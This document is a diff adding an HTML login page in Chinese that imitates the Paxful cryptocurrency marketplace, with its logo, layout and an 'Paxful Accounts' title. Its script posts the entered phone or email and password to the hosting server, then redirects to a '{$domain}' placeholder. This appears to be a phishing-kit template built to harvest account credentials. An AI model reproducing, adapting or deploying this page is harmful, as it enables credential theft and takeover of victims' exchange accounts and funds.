@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+     
+        <link rel="icon" href="/static/favicons/favicon.ico" />
+        <link rel="apple-touch-icon" href="/static/favicons/apple-touch-icon.png" />
+        <link
+            rel="apple-touch-icon"
+            sizes="57x57"
+            href="/static/favicons/apple-icon-57x57.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="60x60"
+            href="/static/favicons/apple-icon-60x60.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="72x72"
+            href="/static/favicons/apple-icon-72x72.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="76x76"
+            href="/static/favicons/apple-icon-76x76.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="114x114"
+            href="/static/favicons/apple-icon-114x114.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="120x120"
+            href="/static/favicons/apple-icon-120x120.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="144x144"
+            href="/static/favicons/apple-icon-144x144.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="152x152"
+            href="/static/favicons/apple-icon-152x152.png"
+        />
+        <link
+            rel="apple-touch-icon"
+            sizes="180x180"
+            href="/static/favicons/apple-icon-180x180.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/static/favicons/favicon-32x32.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="96x96"
+            href="/static/favicons/favicon-96x96.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/static/favicons/favicon-16x16.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="192x192"
+            href="/static/favicons/favicon-192x192.png"
+        />
+       
+        <meta name="msapplication-TileColor" content="#6b33a7" />
+        <meta
+            name="msapplication-TileImage"
+            content="/static/favicons/ms-icon-144x144.png"
+        />
+        <meta
+            name="msapplication-square70x70logo"
+            content="/static/favicons/ms-icon-70x70.png"
+        />
+        <meta
+            name="msapplication-square150x150logo"
+            content="/static/favicons/ms-icon-150x150.png"
+        />
+        <meta
+            name="msapplication-square310x310logo"
+            content="/static/favicons/ms-icon-310x310.png"
+        />
+        <meta
+            name="msapplication-wide310x150logo"
+            content="/static/favicons/ms-icon-310x150.png"
+        />
+        <meta name="theme-color" content="#6b33a7" />
+        <meta name="theme-color" content="#000000" />
+        <meta name="description" content="" />
+        <meta property="og:image" content="/static/og_images/general.jpg" />
+        <meta property="og:image:type" content="image/jpeg" />
+        <meta property="og:image:width" content="1200" />
+        <meta property="og:image:height" content="630" />
+        <link href="/static/css/vendors.css" rel="stylesheet" />
+        <link href="/static/css/login.css" rel="stylesheet" />
+        <link href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" rel="stylesheet" />
+           <script src="/static/js/vue.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script type="text/javascript" src="/static/js/jquery-1.12.4.min.js"></script>
+    <script src="/static/js/main.js"></script>
+    <script src="/dist/layer.js"></script>
+        <title>Paxful Accounts</title>
+    </head>
+
+    <body class="ltr">
+       
+        
+        <div id="root"><div class="MainTemplate__page"><div class="row align-items-stretch MainTemplate__row"><div class="col-12 col-xl-5 col-lg-6 px-xl-7 py-3 py-5 py-md-7 d-flex justify-content-center justify-content-lg-end"><div class="w-100 d-flex flex-column align-items-start px-3 px-md-4 px-xl-0 MainTemplate__content"><div class="d-flex align-items-center justify-content-between w-100 mb-5 dark-theme-icon-disable"><a href="/"><svg viewBox="0 0 123.7 23.3" xmlns="http://www.w3.org/2000/svg" fill="#333" width="120"><path d="M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z"></path><path d="M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z" fill="#00a5ef"></path></svg></a><div class="d-flex"><div class="d-block dropdown"><button type="button" aria-haspopup="true" aria-expanded="false" class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-light"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="mr-2 text-gray-500"><path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM1.8 8c0-.8.2-1.6.4-2.3.5.3 1.2.6 1.9.7C4 7 4 7.5 4 8s0 1 .1 1.6c-.7.1-1.4.4-1.9.7-.2-.7-.4-1.5-.4-2.3zm4 0c0-.4 0-.8.1-1.2.7.1 1.4.1 2.1.1s1.4 0 2.1-.1c0 .4.1.8.1 1.2s0 .8-.1 1.2c-.7-.1-1.4-.1-2.1-.1s-1.4 0-2.1.1c-.1-.4-.1-.8-.1-1.2zm6.1-1.6c.7-.2 1.3-.4 1.8-.7.3.7.5 1.5.5 2.3s-.2 1.6-.4 2.3c-.5-.3-1.1-.6-1.8-.7V8c0-.5 0-1-.1-1.6zm1-2.2c-.2.2-.6.3-1.2.5-.2-.8-.4-1.5-.7-2.1.7.3 1.3.9 1.9 1.6zM8 1.8c.1 0 .6.1 1.2 1.3.3.6.5 1.2.7 1.9-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1c.2-.7.4-1.3.6-1.8.7-1.3 1.2-1.4 1.3-1.4zm-2.9.7c-.3.7-.5 1.4-.7 2.2-.6-.2-1-.3-1.3-.5.6-.7 1.2-1.3 2-1.7zm-2 9.3c.2-.2.6-.3 1.2-.5.2.8.4 1.5.7 2.1-.7-.3-1.3-.9-1.9-1.6zM8 14.2c-.1 0-.6-.1-1.2-1.3-.3-.5-.5-1.1-.6-1.8.6-.1 1.2-.1 1.9-.1s1.3 0 1.9.1c-.2.7-.4 1.3-.6 1.8-.8 1.2-1.3 1.3-1.4 1.3zm2.9-.7c.3-.6.5-1.4.7-2.1.6.2 1 .3 1.2.5-.5.6-1.1 1.2-1.9 1.6z"></path></svg>简体中文(SC)<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="ml-2 LanguageSelector__icon text-gray-500"><path fill-rule="evenodd" d="M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z" clip-rule="evenodd"></path></svg></button><div tabindex="-1" role="menu" aria-hidden="true" class="rounded DropdownMenu-module_menu__2I4mi overflow-auto LanguageSelector__dropdown dropdown-menu"><div class=""><div class="LanguageSelector__columns">
+            <button type="button" class="dropdown-item d-inline-flex LanguageItem__langSelected btn btn-link btn-lg">
+                <svg width="16" height="16" stroke="currentColor" viewBox="0 0 16 16" fill="none" class="text-primary mr-2"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2 8.586L6 12l8-8"></path></svg>
+                <span class="ml-0">简体中文(SC)</span></button>
+            <button type="button" class="dropdown-item d-inline-flex btn btn-link btn-lg"><span class="ml-4">繁體中文(TC)</span></button>
+            </div></div></div></div></div></div><div class="w-100 d-flex flex-grow-1"><div class="w-100 h-100"><h1 class="h2 qa-login-page-title mb-3 mb-lg-4">用Paxful登录</h1>
+            <div class="alert alert-info d-flex align-items-start font-weight-semibold regular-18 lh-16 mb-3 mb-xs-4"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="mr-2_5 icon"><path fill-rule="evenodd" d="M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg><div class="d-flex flex-column flex-xs-row">重要提示！请检查您访问的是{$domain}</div></div>
+            <div class="mb-3"><div v-if="tips" class="alert alert-danger d-flex align-items-start"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="mr-2_5 icon"><path fill-rule="evenodd" d="M8 2a6 6 0 100 12A6 6 0 008 2zM0 8a8 8 0 1116 0A8 8 0 010 8zm9-3a1 1 0 11-2 0 1 1 0 012 0zM8 7a1 1 0 00-1 1v3a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>请输入正确的邮箱地址和密码。请注意，两个字段都要区分大小写。</div></div><form><div class="mb-3"><label for="username" class="label-small font-weight-semibold">您的电话号码或电子邮箱</label><div><div><div class="d-flex align-items-center justify-content-between form-control">
+                <input name="username" type="text" class="min-width-0 border-transparent py-0 form-control" v-model="tel" value="">
+                </div></div><div class="position-relative cursor-pointer"></div></div></div><div class="mb-4"><div class="d-flex align-items-start justify-content-between"><label for="password" class="label-small font-weight-semibold">您的密码</label><a class="regular-20 lh-16" tabindex="-1" href="/user/login/password">忘记密码?</a></div><div><div class="d-flex align-items-center justify-content-between form-control mb-2">
+                    <input name="password" id="password" autocomplete="current-password" data-recording-disable="true" type="password" class="min-width-0 border-transparent py-0 form-control" v-model="pwd" :type="input1" value="">
+                    <button type="button" class="text-gray-600 btn-square btn btn-transparent btn-md">
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="d-block" v-if="eye" @click="showpassword()"><path fill-rule="evenodd" d="M2.03 8.006L2.027 8l.003-.006a2.35 2.35 0 01.287-.41c.288-.344.73-.753 1.3-1.145C4.762 5.65 6.318 5 8 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148C11.235 10.344 9.68 11 8 11c-1.682 0-3.238-.65-4.383-1.439-.57-.392-1.012-.8-1.3-1.144a2.397 2.397 0 01-.287-.41zM8 3c-2.184 0-4.128.836-5.517 1.79-.696.48-1.279 1.007-1.7 1.51a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13c2.186 0 4.131-.844 5.518-1.802.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3zm0 7a2 2 0 100-4 2 2 0 000 4z" clip-rule="evenodd"></path></svg>
+                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="d-block" v-else @click="showpassword()"><path fill-rule="evenodd" d="M2.707 1.293a1 1 0 00-1.414 1.414l1.734 1.734c-.19.114-.37.231-.544.35-.696.479-1.279 1.006-1.7 1.509a4.29 4.29 0 00-.528.772C.128 7.317 0 7.642 0 8c0 .358.128.683.255.928.135.26.318.522.528.772.421.503 1.004 1.03 1.7 1.51C3.872 12.163 5.816 13 8 13a9.15 9.15 0 003.048-.538l2.245 2.245a1 1 0 001.414-1.414l-1.74-1.74c.192-.115.376-.234.551-.355.696-.48 1.278-1.008 1.698-1.508.21-.25.392-.508.527-.766.126-.24.257-.565.257-.924 0-.359-.13-.684-.257-.924a4.385 4.385 0 00-.527-.766c-.42-.5-1.002-1.027-1.698-1.508C12.131 3.844 10.186 3 8 3a9.2 9.2 0 00-3.05.535L2.706 1.293zm1.788 4.616a8.599 8.599 0 00-.878.53c-.57.392-1.012.8-1.3 1.144a2.397 2.397 0 00-.287.41L2.027 8l.003.006c.05.098.143.238.287.41.288.344.73.753 1.3 1.145C4.762 10.35 6.318 11 8 11c.49 0 .97-.056 1.431-.155l-.913-.913a2.003 2.003 0 01-2.45-2.45L4.495 5.909zm2.987.159l-.914-.915A6.906 6.906 0 018 5c1.68 0 3.235.656 4.381 1.448a6.704 6.704 0 011.303 1.148c.142.17.234.307.285.404a2.465 2.465 0 01-.285.404 6.704 6.704 0 01-1.303 1.148 8.645 8.645 0 01-.88.534l-1.57-1.568a2.003 2.003 0 00-2.45-2.45z" clip-rule="evenodd"></path></svg>
+                        </button></div></div></div><button type="button" class="py-3 d-flex justify-content-between btn btn-primary btn-lg btn-block" v-on:click.once="login()"><span>登录</span><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="reflect-element"><path fill-rule="evenodd" d="M4.294 13.292l5.292-5.293-5.292-5.293a1 1 0 111.414-1.414l6 6a.99.99 0 01.277.53L12 7.94v.118a.996.996 0 01-.291.648l-6 6a1 1 0 11-1.414-1.414z" clip-rule="evenodd"></path></svg></button></form><hr class="mt-4"><span class="d-flex regular-24">刚刚来到Paxful?<a href="/user/register" class="ml-2">创建账号</a></span></div></div></div></div><div class="d-none d-lg-block col-12 col-xl-7 col-lg-6 pl-0 overflow-hidden bg-blue-100"><div class="d-flex align-items-center justify-content-center h-100 overflow-hidden"><img src="/static/dist/assets/images/log-in@1x-66ff6d4608ab29a6710651bfd9e6171c.webp" srcset="/static/dist/assets/images/log-in@1.5x-ac6b0b2e5316801c22536af43a60755f.webp 900w, /static/dist/assets/images/log-in@1x-66ff6d4608ab29a6710651bfd9e6171c.webp 600w" loading="lazy" alt="创建账号" sizes="(max-width: 1200px) 400px, (max-width: 1400px) 500px, 600px" style="opacity: 1;"></div></div></div></div></div>
+        
+    <script>
+new Vue({
+    el: '#root',
+  data:{
+      tel: '',
+      pwd:'',
+       input1:'password',
+      eye:true,
+      tips:false
+     
+  },
+  methods: {
+      
+    showpassword(){
+       var that=this;
+       if(that.eye){
+         that.eye=false; 
+         that.input1='text'; 
+       }else{
+         that.eye=true; 
+         that.input1='password';   
+       }
+    },
+   
+  login () {
+     var that=this;
+    // Vue.http.options.emulateJSON = true;  
+    that.$http({
+      method: 'post',
+      url: '/user/login',
+      data: {
+        username: that.tel,
+        password: that.pwd,
+        
+       
+      }
+   }) .then(function (response) {
+    console.log(response);
+    var data =response.data;
+    if(data.code==0){
+      
+        that.tips=true;
+     
+     /*   layer.msg(data.msg, {
+  icon: 1,
+  time: 3000 
+}, function(){
+ 
+}); */
+ window.location.reload();  
+    }else{
+        console.log(data);
+        
+        
+         layer.msg('登陆成功', {
+                            offset: '15px'
+                            ,icon: 1
+                            ,time: 3000
+                        }, function(){
+                         
+                        });
+                      
+                       window.location.href = "{$domain}";
+    }
+  })
+  .catch(function (error) {
+    console.log(error);
+  });
+},
+
+}
+});
+</script>
+</body>
+</html>
